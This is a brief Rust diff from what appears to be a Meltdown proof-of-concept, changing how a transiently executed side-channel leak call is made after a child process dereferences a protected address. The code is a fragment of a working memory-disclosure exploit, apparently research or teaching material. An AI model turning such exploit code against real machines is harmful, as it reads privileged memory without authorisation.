@@ -17,7 +17,7 @@ impl Meltdown for MeltdownUS {
                 self.channel.reset();
 
                 let secret = unsafe { *addr }; // Will raise segfault
-                self.channel.leak(secret); // Executed transiently
+                self.channel.leak_without_prev_reset(secret); // Executed transiently
                 std::process::exit(0);
             }
             Ok(ForkResult::Parent { child }) => {
